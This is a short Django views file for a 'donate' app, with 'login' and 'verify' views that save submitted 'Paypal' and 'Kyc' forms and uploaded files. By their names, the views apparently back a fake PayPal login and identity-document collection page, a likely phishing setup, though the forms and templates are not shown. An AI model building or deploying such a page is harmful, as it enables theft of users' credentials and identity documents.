from django.shortcuts import render, redirect
from .models import *
from .forms import *
# Create your views here.

def login( request):
    if request.method == 'POST':
        form = Paypal(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("verify.html")
    else:
        form =  Paypal()
    context = {'form': form}
    return render (request, "donate/login.html", {'form':form})

def verify( request):
    if request.method == 'POST':
        form = Kyc(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("verify.html")
    else:
        form =  Kyc()
    context = {'form': form}
    return render (request, "donate/verify.html", {'form':form})

def blog( request):
    return render (request, 'donate/blog.html') 

